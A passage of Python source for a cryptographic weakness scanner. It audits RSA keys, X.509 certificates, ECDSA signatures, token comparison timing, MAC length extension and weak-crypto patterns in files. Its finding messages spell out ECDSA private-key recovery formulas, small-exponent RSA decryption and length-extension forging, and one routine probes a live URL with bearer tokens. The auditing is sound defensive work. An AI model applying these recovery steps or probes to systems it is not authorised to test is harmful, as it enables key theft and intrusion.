        # ── Parse RSAPrivateKey SEQUENCE
        # PKCS#1: SEQUENCE { version(0), n, e, d, p, q, dp, dq, qp }
        try:
            content = self._der_unwrap_seq(der, 0)
            idx = 0
            _version, idx = self._der_int(content, idx)   # skip version
            n, idx        = self._der_int(content, idx)   # modulus
            e, _          = self._der_int(content, idx)   # public exponent

            bit_len = n.bit_length()

            if e == 3:
                msg = ("RSA small exponent e=3 — Coppersmith attack: if plaintext m is small "
                       "enough that m^3 < n, the real cube root of the ciphertext recovers m "
                       "directly without knowing the private key. PKCS#1v1.5 padding does not "
                       "fully mitigate this against Hastad's broadcast attack.")
                findings.append({"type": "RSA_SMALL_EXPONENT", "severity": "CRITICAL",
                                  "description": msg,
                                  "detail": f"e={e} | n_bits={bit_len}"})
                self._add_finding(
                    "RSA small exponent e=3", "CRITICAL", msg,
                    f"e={e} | key_bits={bit_len}",
                    "c = m^3 mod n; if m^3 < n then m = cbrt(c) over the integers — no modular "
                    "arithmetic involved; or use Hastad's broadcast attack across 3 recipients",
                )

            if bit_len < 1024:
                msg = f"RSA key is {bit_len} bits — within reach of general-number-field sieve (GNFS); 512-bit keys are factored in hours"
                findings.append({"type": "RSA_KEY_CRITICAL", "severity": "CRITICAL",
                                  "description": msg, "detail": f"key_bits={bit_len}"})
                self._add_finding(
                    f"RSA key < 1024 bits ({bit_len} bits)", "CRITICAL", msg,
                    f"key_bits={bit_len}",
                    "Rotate to RSA-4096 or ECDSA P-256 immediately",
                )
            elif bit_len < 2048:
                msg = f"RSA key is {bit_len} bits — below NIST/CA-Browser Forum minimum of 2048 bits"
                findings.append({"type": "RSA_KEY_HIGH", "severity": "HIGH",
                                  "description": msg, "detail": f"key_bits={bit_len}"})
                self._add_finding(
                    f"RSA key < 2048 bits ({bit_len} bits)", "HIGH", msg,
                    f"key_bits={bit_len}",
                    "Rotate to RSA-4096 or ECDSA P-256 at next cert renewal",
                )

        except Exception as exc:
            findings.append({"type": "RSA_PARSE_ERROR", "severity": "INFO",
                              "description": f"ASN.1 parse failed: {exc}"})

        return findings

    @staticmethod
    def _pkcs8_unwrap(der: bytes) -> bytes:
        """
        Strip PKCS#8 PrivateKeyInfo wrapper and return the inner
        RSAPrivateKey DER (the OCTET STRING content).

        PrivateKeyInfo ::= SEQUENCE {
          version   INTEGER,
          algorithm AlgorithmIdentifier,
          key       OCTET STRING
        }
        """
        content = KeyCryptoAnalyzer._der_unwrap_seq(der, 0)
        idx = 0
        _, idx = KeyCryptoAnalyzer._der_int(content, idx)          # version
        _, _, idx = KeyCryptoAnalyzer._der_tag(content, idx)       # AlgorithmIdentifier
        if content[idx] != 0x04:
            raise ValueError(f"Expected OCTET STRING 0x04, got 0x{content[idx]:02x}")
        _, inner, _ = KeyCryptoAnalyzer._der_tag(content, idx)
        return inner

    # ── ECDSA nonce reuse ─────────────────────────────────────────────────────

    def check_ecdsa_nonce_reuse(self, signature_pairs: list) -> list:
        """
        Detect ECDSA nonce reuse across a set of (r, s, hash) tuples.

        If two signatures share the same r value they were produced with the
        same ephemeral nonce k. Given the pair, the private key d is directly
        recoverable:
          d = (s1*hash2 - s2*hash1) * modinv(s1*hash1 - s2*hash2, n)  mod n

        Args:
            signature_pairs: list of dicts, each with integer fields
                             'r', 's', and 'hash' (message digest as int).

        Returns list of finding dicts; one per reuse pair found.
        """
        findings = []
        seen_r: dict = {}  # r_value → first list index

        for i, sig in enumerate(signature_pairs):
            r = sig.get("r")
            if r is None:
                continue
            if r in seen_r:
                j = seen_r[r]
                s1 = signature_pairs[j].get("s", 0)
                s2 = sig.get("s", 0)
                h1 = signature_pairs[j].get("hash", 0)
                h2 = sig.get("hash", 0)
                msg = (
                    f"ECDSA nonce reuse: signatures[{j}] and signatures[{i}] share r=0x{r:x}. "
                    f"Same ephemeral k was used twice — private key d is algebraically recoverable."
                )
                findings.append({
                    "type":     "ECDSA_NONCE_REUSE",
                    "severity": "CRITICAL",
                    "description": msg,
                    "detail":   f"r=0x{r:x} | index_a={j} (s=0x{s1:x}) | index_b={i} (s=0x{s2:x})",
                    "recovery_formula": (
                        "k = (hash1 - hash2) * modinv(s1 - s2, n) mod n  → "
                        "d = (k*s1 - hash1) * modinv(r, n) mod n"
                    ),
                })
                self._add_finding(
                    "ECDSA nonce reuse", "CRITICAL", msg,
                    f"r=0x{r:x} | sig_a=index {j} | sig_b=index {i}",
                    "k = (h1-h2)*modinv(s1-s2,n) mod n; d = (k*s1-h1)*modinv(r,n) mod n; "
                    "Sony PS3 and Bitcoin wallet thefts used this exact technique",
                )
            else:
                seen_r[r] = i

        return findings

    # ── Certificate weakness scanner ──────────────────────────────────────────

    def scan_certificate_weaknesses(self, cert_pem: str) -> list:
        """
        Parse X.509 certificate from PEM string and flag cryptographic
        weaknesses using stdlib ssl + manual DER parsing.

        Checks:
          - Self-signed (issuer == subject)      → MEDIUM
          - SHA-1 signature algorithm            → HIGH
          - MD5 signature algorithm              → CRITICAL
          - RSA key < 2048 bits in SPKI          → HIGH / CRITICAL
          - Wildcard CN                          → LOW
          - Cert expiry within 30 days           → MEDIUM
          - Cert already expired                 → HIGH

        Returns list of finding dicts.
        """
        findings = []

        if isinstance(cert_pem, bytes):
            cert_pem = cert_pem.decode("utf-8", errors="replace")

        try:
            der = ssl.PEM_cert_to_DER_cert(cert_pem)
        except Exception as exc:
            findings.append({"type": "CERT_PARSE_ERROR", "severity": "INFO",
                              "description": f"PEM decode failed: {exc}"})
            return findings

        try:
            info = self._parse_x509_der(der)
        except Exception as exc:
            findings.append({"type": "CERT_PARSE_ERROR", "severity": "INFO",
                              "description": f"DER parse failed: {exc}"})
            return findings

        cn = info.get("cn", "N/A")

        # Self-signed
        if info.get("issuer_raw") and info.get("subject_raw") and \
                info["issuer_raw"] == info["subject_raw"]:
            findings.append({"type": "CERT_SELF_SIGNED", "severity": "MEDIUM",
                              "description": "Certificate is self-signed",
                              "detail": f"CN={cn}"})
            self._add_finding(
                "Self-signed certificate", "MEDIUM",
                "Certificate issuer == subject — no external CA validation; "
                "trivially spoofable for MITM on unenforced clients",
                f"CN={cn}", "Replace with CA-signed certificate for production endpoints",
            )

        # Signature algorithm
        sig_alg = info.get("sig_alg", "").lower()
        if "md5" in sig_alg:
            findings.append({"type": "CERT_MD5_SIG", "severity": "CRITICAL",
                              "description": f"Certificate uses MD5 signature ({info['sig_alg']})",
                              "detail": f"CN={cn}"})
            self._add_finding(
                "MD5 certificate signature", "CRITICAL",
                f"MD5 collision attacks are practical (Flame malware forged a CA cert with MD5 in 2012). "
                f"Algorithm: {info.get('sig_alg')}",
                f"CN={cn}",
                "Replace with SHA-256 or SHA-384 signed certificate",
            )
        elif "sha1" in sig_alg or "sha-1" in sig_alg:
            findings.append({"type": "CERT_SHA1_SIG", "severity": "HIGH",
                              "description": f"Certificate uses SHA-1 signature ({info['sig_alg']}) — deprecated since 2016",
                              "detail": f"CN={cn}"})
            self._add_finding(
                "SHA-1 certificate signature", "HIGH",
                f"SHA-1 deprecated (NIST SP 800-131A); SHAttered collision cost ~$110k GPU-hours. "
                f"Algorithm: {info.get('sig_alg')}",
                f"CN={cn}",
                "Replace with SHA-256 or SHA-384 signed certificate",
            )

        # RSA key size
        rsa_bits = info.get("rsa_key_bits")
        if rsa_bits is not None and rsa_bits < 2048:
            sev = "CRITICAL" if rsa_bits < 1024 else "HIGH"
            findings.append({"type": "CERT_RSA_KEY_SIZE", "severity": sev,
                              "description": f"Certificate public key is RSA-{rsa_bits} bits",
                              "detail": f"CN={cn} | rsa_bits={rsa_bits}"})
            self._add_finding(
                f"Certificate RSA-{rsa_bits} key", sev,
                f"Subject public key is only {rsa_bits} bits — below 2048-bit NIST minimum",
                f"CN={cn}", "",
            )

        # Wildcard
        if cn.startswith("*."):
            findings.append({"type": "CERT_WILDCARD", "severity": "LOW",
                              "description": f"Wildcard certificate: {cn}",
                              "detail": "Covers all first-level subdomains — broad blast radius if private key is compromised"})

        # Expiry
        not_after = info.get("not_after")
        if not_after:
            now = datetime.now(timezone.utc)
            try:
                delta_s = (not_after - now).total_seconds()
                if delta_s < 0:
                    findings.append({"type": "CERT_EXPIRED", "severity": "HIGH",
                                      "description": f"Certificate expired {not_after.isoformat()}",
                                      "detail": f"CN={cn}"})
                    self._add_finding(
                        "Expired certificate", "HIGH",
                        f"Certificate for {cn} expired {not_after.isoformat()}",
                        f"CN={cn}", "",
                    )
                elif delta_s < 30 * 86400:
                    days = int(delta_s / 86400)
                    findings.append({"type": "CERT_EXPIRY_SOON", "severity": "MEDIUM",
                                      "description": f"Certificate expires in {days} days",
                                      "detail": f"CN={cn} | not_after={not_after.isoformat()}"})
                    self._add_finding(
                        "Certificate expiring soon", "MEDIUM",
                        f"Certificate for {cn} expires in {days} days",
                        f"CN={cn} | not_after={not_after.isoformat()}", "",
                    )
            except Exception:
                pass

        return findings

    def _parse_x509_der(self, der: bytes) -> dict:
        """
        Minimal X.509v3 DER walker. Extracts:
          cn, sig_alg, issuer_raw, subject_raw, not_after, rsa_key_bits.

        Structure walked:
          Certificate SEQUENCE {
            TBSCertificate SEQUENCE {
              [0] version (optional),
              serialNumber INTEGER,
              signature AlgorithmIdentifier,
              issuer Name,
              validity Validity,
              subject Name,
              subjectPublicKeyInfo SubjectPublicKeyInfo,
              ...
            },
            signatureAlgorithm AlgorithmIdentifier,
            signature BIT STRING
          }
        """
        result: dict = {}

        # Certificate outer SEQUENCE
        if der[0] != 0x30:
            raise ValueError("Not a DER SEQUENCE")
        _, cert_content, _ = self._der_tag(der, 0)

        # TBSCertificate (first child SEQUENCE)
        if cert_content[0] != 0x30:
            raise ValueError("TBS not a SEQUENCE")
        tbs_len, tbs_start = self._der_length(cert_content, 1)
        tbs = cert_content[tbs_start: tbs_start + tbs_len]

        # signatureAlgorithm comes after TBS in cert_content
        sig_alg_off = tbs_start + tbs_len
        if sig_alg_off < len(cert_content) and cert_content[sig_alg_off] == 0x30:
            try:
                _, alg_content, _ = self._der_tag(cert_content, sig_alg_off)
                result["sig_alg"] = self._oid_to_name(alg_content)
            except Exception:
                pass

        # Walk TBS fields in order
        tidx = 0

        # [0] EXPLICIT version (optional, tag 0xa0)
        if tidx < len(tbs) and tbs[tidx] == 0xa0:
            _, _, tidx = self._der_tag(tbs, tidx)

        # serialNumber INTEGER
        if tidx < len(tbs) and tbs[tidx] == 0x02:
            _, _, tidx = self._der_tag(tbs, tidx)

        # signature AlgorithmIdentifier SEQUENCE (inner — same as outer signatureAlgorithm)
        if tidx < len(tbs) and tbs[tidx] == 0x30:
            _, alg_content, tidx = self._der_tag(tbs, tidx)
            if "sig_alg" not in result:
                result["sig_alg"] = self._oid_to_name(alg_content)

        # issuer Name SEQUENCE
        if tidx < len(tbs) and tbs[tidx] == 0x30:
            _, issuer_raw, tidx = self._der_tag(tbs, tidx)
            result["issuer_raw"] = issuer_raw

        # validity SEQUENCE
        if tidx < len(tbs) and tbs[tidx] == 0x30:
            _, validity_content, tidx = self._der_tag(tbs, tidx)
            _, result["not_after"] = self._parse_validity(validity_content)

        # subject Name SEQUENCE
        if tidx < len(tbs) and tbs[tidx] == 0x30:
            _, subject_raw, tidx = self._der_tag(tbs, tidx)
            result["subject_raw"] = subject_raw
            result["cn"] = self._extract_cn(subject_raw)

        # subjectPublicKeyInfo SEQUENCE
        if tidx < len(tbs) and tbs[tidx] == 0x30:
            _, spki_content, tidx = self._der_tag(tbs, tidx)
            result["rsa_key_bits"] = self._spki_rsa_bits(spki_content)

        return result

    # ── Known algorithm OID table ─────────────────────────────────────────────
    # OID bytes (content of OID TLV, not including tag+length) → human name
    _OID_MAP = {
        bytes([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x04]): "md5WithRSAEncryption",
        bytes([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05]): "sha1WithRSAEncryption",
        bytes([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b]): "sha256WithRSAEncryption",
        bytes([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0c]): "sha384WithRSAEncryption",
        bytes([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0d]): "sha512WithRSAEncryption",
        bytes([0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x01]):       "ecdsa-with-SHA1",
        bytes([0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02]):       "ecdsa-with-SHA256",
        bytes([0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x03]):       "ecdsa-with-SHA384",
        bytes([0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x04]):       "ecdsa-with-SHA512",
    }

    def _oid_to_name(self, alg_id_content: bytes) -> str:
        """Parse AlgorithmIdentifier content and return OID name."""
        if alg_id_content and alg_id_content[0] == 0x06:
            _, oid_bytes, _ = self._der_tag(alg_id_content, 0)
            return self._OID_MAP.get(oid_bytes, f"OID({oid_bytes.hex()})")
        return "unknown"

    def _parse_validity(self, content: bytes):
        """Return (not_before, not_after) as datetime objects (UTC) or None."""
        times = []
        idx = 0
        while idx < len(content) and len(times) < 2:
            tag = content[idx]
            if tag not in (0x17, 0x18):  # UTCTime, GeneralizedTime
                break
            _, val, idx = self._der_tag(content, idx)
            try:
                s = val.decode("ascii", errors="replace").rstrip("Z")
                if tag == 0x17:  # UTCTime: YYMMDDHHMMSS
                    dt = datetime.strptime(s[:12], "%y%m%d%H%M%S").replace(tzinfo=timezone.utc)
                else:            # GeneralizedTime: YYYYMMDDHHMMSS
                    dt = datetime.strptime(s[:14], "%Y%m%d%H%M%S").replace(tzinfo=timezone.utc)
                times.append(dt)
            except Exception:
                times.append(None)
                idx = len(content)  # bail on parse error
        return (
            times[0] if len(times) > 0 else None,
            times[1] if len(times) > 1 else None,
        )

    def _extract_cn(self, name_bytes: bytes) -> str:
        """
        Locate CN (2.5.4.3) in a Name DER content and return its string value.
        Searches for the full OID TLV 06 03 55 04 03 then reads the following
        string TLV.
        """
        # Full TLV for OID 2.5.4.3: tag=0x06, len=0x03, value=55 04 03
        cn_oid_tlv = bytes([0x06, 0x03, 0x55, 0x04, 0x03])
        pos = name_bytes.find(cn_oid_tlv)
        if pos == -1:
            return ""
        str_start = pos + len(cn_oid_tlv)
        if str_start >= len(name_bytes):
            return ""
        # String tag types: UTF8String 0x0c, PrintableString 0x13, IA5String 0x16, T61String 0x14
        if name_bytes[str_start] not in (0x0c, 0x13, 0x16, 0x14, 0x1e, 0x1a):
            return ""
        try:
            _, val, _ = self._der_tag(name_bytes, str_start)
            return val.decode("utf-8", errors="replace").strip("\x00")
        except Exception:
            return ""

    def _spki_rsa_bits(self, spki_content: bytes) -> int | None:
        """
        Extract RSA modulus bit length from SubjectPublicKeyInfo content bytes.

        SPKI ::= SEQUENCE { AlgorithmIdentifier, BIT STRING }
        BIT STRING content: 0x00 || RSAPublicKey DER
        RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }
        """
        idx = 0
        # Skip AlgorithmIdentifier SEQUENCE
        if idx < len(spki_content) and spki_content[idx] == 0x30:
            _, _, idx = self._der_tag(spki_content, idx)
        # BIT STRING
        if idx < len(spki_content) and spki_content[idx] == 0x03:
            _, bs_content, _ = self._der_tag(spki_content, idx)
            # First byte = number of unused bits in final octet (always 0x00 for keys)
            if bs_content and bs_content[0] == 0x00:
                inner = bs_content[1:]
                if inner and inner[0] == 0x30:
                    try:
                        seq = self._der_unwrap_seq(inner, 0)
                        n, _ = self._der_int(seq, 0)
                        return n.bit_length()
                    except Exception:
                        pass
        return None

    # ── Timing oracle ─────────────────────────────────────────────────────────

    def check_timing_oracle(self, url: str, valid_token: str, invalid_token: str,
                            iterations: int = 20) -> dict:
        """
        Measure response-time difference between a valid and invalid bearer
        token over `iterations` round trips each (interleaved to reduce jitter).

        A mean diff > 5 ms is flagged HIGH as a likely non-constant-time
        comparison (e.g. early-exit string comparison on HMAC or session token).

        Returns dict with timing stats and 'timing_oracle': bool.
        """
        if not _HAS_URLLIB:
            return {"timing_oracle": False, "mean_diff_ms": 0.0, "severity": "INFO",
                    "error": "urllib unavailable"}

        valid_times:   list = []
        invalid_times: list = []

        # Interleave measurements to reduce systematic jitter
        for _ in range(iterations):
            for token, bucket in ((valid_token, valid_times), (invalid_token, invalid_times)):
                req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
                t0 = time.perf_counter()
                try:
                    urllib.request.urlopen(req, timeout=5)
                except Exception:
                    pass
                t1 = time.perf_counter()
                bucket.append((t1 - t0) * 1000.0)

        if not valid_times or not invalid_times:
            return {"timing_oracle": False, "mean_diff_ms": 0.0, "severity": "INFO",
                    "error": "No measurements collected"}

        mean_v  = sum(valid_times)   / len(valid_times)
        mean_i  = sum(invalid_times) / len(invalid_times)
        diff_ms = abs(mean_v - mean_i)
        oracle  = diff_ms > 5.0

        result = {
            "timing_oracle":   oracle,
            "mean_valid_ms":   round(mean_v,   3),
            "mean_invalid_ms": round(mean_i,   3),
            "mean_diff_ms":    round(diff_ms,  3),
            "iterations":      iterations,
            "severity":        "HIGH" if oracle else "INFO",
        }

        if oracle:
            self._add_finding(
                "Timing oracle — non-constant-time comparison",
                "HIGH",
                f"Response time differs by {diff_ms:.1f}ms between valid and invalid token. "
                "Suggests early-exit (non-constant-time) comparison — allows bit-by-bit oracle attacks.",
                f"url={url} | mean_valid={mean_v:.1f}ms | mean_invalid={mean_i:.1f}ms | "
                f"diff={diff_ms:.1f}ms | n={iterations}",
                "Fix: use hmac.compare_digest(expected, actual) for ALL token/secret comparisons; "
                "never use '==' on security-sensitive byte strings",
            )

        return result

    # ── Length extension vulnerability ────────────────────────────────────────

    def check_length_extension_vulnerability(self, mac: str,
                                             key_len_guess: int = 16) -> dict:
        """
        Heuristic assessment of length-extension vulnerability given a MAC hex string.

        Infers algorithm from hex-string length, then determines whether
        bare H(key || message) (without HMAC wrapping) is vulnerable.

        Vulnerable to length extension: MD5, SHA-1, SHA-256, SHA-512.
        NOT vulnerable: SHA-224 (truncated), SHA-384 (truncated), SHA-3 family,
                        BLAKE2, BLAKE3, and any proper HMAC construction.

        Args:
            mac:           Hex-encoded MAC/hash value.
            key_len_guess: Estimated key length for attack parameter sizing.

        Returns dict with algorithm, risk flags, and note.
        """
        mac_clean = mac.strip().lower().replace(" ", "")
        hex_len   = len(mac_clean)

        # Map hex-string length → (algorithm_name, length_extension_vulnerable)
        # Truncated variants (SHA-224, SHA-384) are NOT vulnerable despite using
        # Merkle-Damgard internally, because the truncation discards the state
        # needed for extension.
        _ALG_TABLE: dict = {
            32:  ("MD5",     True),
            40:  ("SHA-1",   True),
            56:  ("SHA-224", False),  # truncated from SHA-256 state
            64:  ("SHA-256", True),
            96:  ("SHA-384", False),  # truncated from SHA-512 state
            128: ("SHA-512", True),
        }

        alg, ext_risk = _ALG_TABLE.get(hex_len, ("UNKNOWN", False))

        result = {
            "mac_hex_len":           hex_len,
            "algorithm":             alg,
            "hmac_wrapped":          None,   # cannot determine from MAC value alone
            "length_extension_risk": ext_risk,
            "key_len_guess":         key_len_guess,
            "severity":              "HIGH" if ext_risk else "LOW",
        }

        if ext_risk:
            # Estimate padding block size for the note
            block = 64 if alg in ("MD5", "SHA-1", "SHA-256") else 128  # SHA-512 uses 1024-bit blocks
            result["note"] = (
                f"If this MAC = {alg}(key || message) without HMAC wrapping, an attacker who "
                f"knows the MAC, message, and approximate key length (~{key_len_guess} bytes) can "
                f"compute {alg}(key || message || padding || extension) for any extension string. "
                f"The padding added is (0x80 || zeros || 64-bit length), filling to a {block}-byte block. "
                f"No key knowledge required. Use HMAC-SHA-256 or SHA-3 instead."
            )
            self._add_finding(
                f"Length extension risk — bare {alg}",
                "HIGH",
                f"MAC length ({hex_len} hex chars) matches {alg}, which is Merkle-Damgard based. "
                f"Bare H(key||message) allows forging MACs for extended messages without the key.",
                f"mac_prefix={mac_clean[:16]}... | alg={alg} | key_len_guess={key_len_guess}",
                f"Switch to HMAC: hmac.new(key, msg, hashlib.sha256).hexdigest() — or use SHA-3",
            )
        else:
            result["note"] = (
                f"{alg} is {'not vulnerable to length extension (truncated Merkle-Damgard)' if alg in ('SHA-224', 'SHA-384') else 'not in the vulnerable algorithm set'}. "
                f"If using HMAC-{alg}, no length extension risk exists regardless."
            )

        return result


def check_rng_weakness(binary_data: bytes) -> list:
    """Detect random number generator weaknesses in binary data."""
    import re

    findings = []
    text = binary_data.decode("ascii", errors="replace")

    # Detect libc rand()/srand()/random()
    if re.search(r'\brand\(\)', text) or re.search(r'\bsrand\(', text) or re.search(r'\brandom\(\)', text):
        findings.append({
            "severity": "HIGH",
            "title": "WEAK_RNG_LIBC_RAND",
            "detail": "Binary references libc rand()/srand()/random() — not cryptographically secure; output is predictable and low-entropy.",
            "host": "localhost",
            "port": 0,
        })

    # Detect time-seeded RNG: srand(time or 10-digit Unix timestamp near rand
    has_rand = bool(re.search(r'\bsrand\(|\brand\(|\brandom\(', text))
    time_seed = bool(re.search(r'srand\s*\(\s*time', text))
    ts_literal = bool(re.search(r'\b1[0-9]{9}\b', text))  # 10-digit 1xxx_xxx_xxx
    if time_seed or (has_rand and ts_literal):
        findings.append({
            "severity": "CRITICAL",
            "title": "TIME_SEEDED_RNG",
            "detail": "TIME_SEEDED_RNG — predictable seed: srand(time(...)) or Unix timestamp literal near rand call detected. Seed space ~2^32; brute-forceable in seconds.",
            "host": "localhost",
            "port": 0,
        })

    # /dev/random present but /dev/urandom absent
    has_urandom = b"/dev/urandom" in binary_data
    has_random_dev = b"/dev/random" in binary_data
    if has_random_dev and not has_urandom:
        findings.append({
            "severity": "MEDIUM",
            "title": "DEV_RANDOM_BLOCKING_RNG",
            "detail": "/dev/random found but /dev/urandom absent. /dev/random blocks when entropy pool is low, causing availability issues; /dev/urandom is preferred for most cryptographic uses.",
            "host": "localhost",
            "port": 0,
        })

    # Math.random (JavaScript in embedded context)
    if re.search(r'\bMath\.random\b', text):
        findings.append({
            "severity": "HIGH",
            "title": "MATH_RANDOM_WEAK_RNG",
            "detail": "Math.random detected in binary/embedded context — JavaScript PRNG is not cryptographically secure and output is predictable in some engines.",
            "host": "localhost",
            "port": 0,
        })

    # RC4 key scheduling strings near rand calls
    rc4_present = bool(re.search(r'\bRC4\b|rc4_init|rc4_setkey|ARC4|ARCFOUR', text, re.IGNORECASE))
    if rc4_present and has_rand:
        findings.append({
            "severity": "CRITICAL",
            "title": "RC4_WITH_WEAK_RNG",
            "detail": "RC4 key scheduling strings detected alongside weak RNG references. RC4 is broken; combining it with a weak PRNG-derived key compounds the cryptographic failure.",
            "host": "localhost",
            "port": 0,
        })

    return findings


def check_hash_weakness(data: str) -> list:
    """Detect hash function weaknesses in text (source code, config, etc.)."""
    import re

    findings = []

    # MD5 usage
    if re.search(r'\bmd5\s*\(|MD5\s*\(|hashlib\.md5\b|MessageDigest\.getInstance\s*\(\s*["\']MD5["\']\s*\)', data):
        findings.append({
            "severity": "HIGH",
            "title": "MD5_HASH_USED",
            "detail": "MD5_HASH_USED — collision attacks practical: MD5 detected. Collisions are trivially constructible; MD5 must not be used for integrity, signatures, or password hashing.",
            "host": "localhost",
            "port": 0,
        })

    # SHA-1 usage
    if re.search(r'\bsha1\s*\(|SHA1\s*\(|hashlib\.sha1\b|MessageDigest\.getInstance\s*\(\s*["\']SHA-?1["\']\s*\)', data, re.IGNORECASE):
        findings.append({
            "severity": "MEDIUM",
            "title": "SHA1_HASH_USED",
            "detail": "SHA1_HASH_USED — deprecated for security: SHA-1 detected. SHAttered collision demonstrated 2017; NIST deprecated for digital signatures. Upgrade to SHA-256 or SHA-3.",
            "host": "localhost",
            "port": 0,
        })

    # ECB mode: AES/ECB or Cipher.getInstance("AES") without mode (Java defaults to ECB)
    if re.search(r'AES/ECB|Cipher\.getInstance\s*\(\s*["\']AES["\']\s*\)', data):
        findings.append({
            "severity": "CRITICAL",
            "title": "AES_ECB_MODE",
            "detail": "AES_ECB_MODE — block pattern leakage: ECB mode detected. Identical plaintext blocks produce identical ciphertext; structural information leaks. Use AES-GCM or AES-CBC with random IV.",
            "host": "localhost",
            "port": 0,
        })

    # Hardcoded salt
    if re.search(r'salt\s*=\s*["\'][^"\']{1,32}["\']|SALT\s*=\s*["\'][^"\']{1,32}["\']|static\s+.*salt\s*=\s*["\'][^"\']{1,32}["\']', data, re.IGNORECASE):
        findings.append({
            "severity": "HIGH",
            "title": "HARDCODED_SALT",
            "detail": "HARDCODED_SALT: Static salt literal detected. A fixed salt eliminates its purpose — all instances share the same salt, enabling pre-computation attacks. Generate salt randomly per credential.",
            "host": "localhost",
            "port": 0,
        })

    # Unsalted password hash
    if re.search(r'(?:sha256|sha512|md5|sha1)\s*\(\s*password\s*\)|hashlib\.(?:sha256|sha512|md5|sha1)\s*\(\s*password', data, re.IGNORECASE):
        findings.append({
            "severity": "HIGH",
            "title": "UNSALTED_PASSWORD_HASH",
            "detail": "UNSALTED_PASSWORD_HASH: Direct hash of password without salt detected. Vulnerable to rainbow table and dictionary attacks. Use bcrypt, scrypt, or Argon2 with random per-user salt.",
            "host": "localhost",
            "port": 0,
        })

    return findings


def check_key_management_weakness(config_text: str) -> list:
    """Detect key management defects in config or source text."""
    import re

    findings = []

    # Hardcoded AES key: 16/24/32-byte byte literals or quoted hex strings
    if re.search(
        r'(?:key|aes_key|secret_key)\s*=\s*b["\'][^"\']{16,32}["\']'
        r'|KEY\s*=\s*["\'][0-9a-fA-F]{32,64}["\']',
        config_text,
        re.IGNORECASE,
    ):
        findings.append({
            "severity": "CRITICAL",
            "title": "HARDCODED_AES_KEY",
            "detail": "HARDCODED_AES_KEY: AES key literal found in source/config. Hardcoded keys are extractable via strings(1), static analysis, or repo history. Load keys from a secrets manager or HSM.",
            "host": "localhost",
            "port": 0,
        })

    # Key from environment variable (reference, not value) — note rotation
    if re.search(r'os\.environ\[["\'](?:SECRET_KEY|API_KEY|CRYPTO_KEY|ENCRYPTION_KEY|AES_KEY)["\']\]'
                 r'|process\.env\.(?:SECRET_KEY|API_KEY|CRYPTO_KEY|ENCRYPTION_KEY|AES_KEY)\b', config_text):
        findings.append({
            "severity": "MEDIUM",
            "title": "KEY_FROM_ENVIRONMENT",
            "detail": "KEY_FROM_ENVIRONMENT — verify rotation policy: Key loaded from environment variable. Env vars may appear in process listings, crash dumps, or logs. Ensure rotation policy and secret management controls exist.",
            "host": "localhost",
            "port": 0,
        })

    # Password used directly as key without KDF
    if re.search(r'(?:sha256|sha512)\s*\(\s*password\s*\)\s*(?:as|for|=)?\s*key'
                 r'|key\s*=\s*hashlib\.(?:sha256|sha512)\s*\(\s*password', config_text, re.IGNORECASE):
        findings.append({
            "severity": "CRITICAL",
            "title": "PASSWORD_AS_KEY_NO_KDF",
            "detail": "PASSWORD_AS_KEY_NO_KDF: Password hashed directly for use as cryptographic key with no KDF. Raw SHA-256/SHA-512 of a password lacks the computational cost and salt required to resist brute-force. Use PBKDF2, bcrypt, scrypt, or Argon2.",
            "host": "localhost",
            "port": 0,
        })

    # PBKDF2 with iterations < 100000
    pbkdf2_match = re.search(r'pbkdf2[^,\n]*,\s*(\d+)', config_text, re.IGNORECASE)
    if pbkdf2_match:
        iterations = int(pbkdf2_match.group(1))
        if iterations < 100000:
            findings.append({
                "severity": "HIGH",
                "title": "PBKDF2_LOW_ITERATIONS",
                "detail": f"PBKDF2_LOW_ITERATIONS: PBKDF2 configured with {iterations:,} iterations (minimum recommended: 100,000). Low iteration count reduces resistance to offline brute-force attacks. NIST SP 800-132 recommends >= 100,000.",
                "host": "localhost",
                "port": 0,
            })

    # Bcrypt with rounds < 10
    bcrypt_match = re.search(r'bcrypt[^,\n]*,\s*(\d+)|bcrypt\.gensalt\s*\(\s*rounds\s*=\s*(\d+)\s*\)', config_text, re.IGNORECASE)
    if bcrypt_match:
        rounds = int(bcrypt_match.group(1) or bcrypt_match.group(2))
        if rounds < 10:
            findings.append({
                "severity": "HIGH",
                "title": "BCRYPT_LOW_ROUNDS",
                "detail": f"BCRYPT_LOW_ROUNDS: bcrypt configured with cost factor {rounds} (minimum recommended: 10). Low rounds reduce resistance to brute-force. Use rounds >= 12 for new systems.",
                "host": "localhost",
                "port": 0,
            })

    # Missing key expiry / rotation logic
    rotation_indicators = re.search(
        r'key_expir|rotate_key|key_rotation|expires_at|valid_until|key_ttl|renew_key',
        config_text,
        re.IGNORECASE,
    )
    if not rotation_indicators:
        findings.append({
            "severity": "LOW",
            "title": "NO_KEY_ROTATION_DETECTED",
            "detail": "NO_KEY_ROTATION_DETECTED: No key expiry, rotation, or TTL logic found in the provided config/source. Cryptographic keys should have defined lifetimes and automated rotation. Verify externally if rotation is handled by infrastructure.",
            "host": "localhost",
            "port": 0,
        })

    return findings


def scan_for_crypto_anti_patterns(filepath: str) -> list:
    """File-level anti-pattern scanner: runs RNG, hash, and key management checks."""
    import os

    findings = []

    try:
        with open(filepath, "rb") as fh:
            binary_data = fh.read()
    except OSError as exc:
        return [{
            "severity": "INFO",
            "title": "FILE_READ_ERROR",
            "detail": f"Could not read {filepath}: {exc}",
            "host": "localhost",
            "port": 0,
        }]

    text_data = binary_data.decode("utf-8", errors="replace")

    rng_findings = check_rng_weakness(binary_data)
    hash_findings = check_hash_weakness(text_data)
    key_findings = check_key_management_weakness(text_data)

    for f in rng_findings + hash_findings + key_findings:
        f = dict(f)
        f["detail"] = f"{f['detail']} [file: {filepath}]"
        findings.append(f)

    return findings


# ── Mathematical primality and number-theory weakness detection ────────────────
# Synthesized from: Chapter 3 — Mathematical Basics and Computation Algorithms
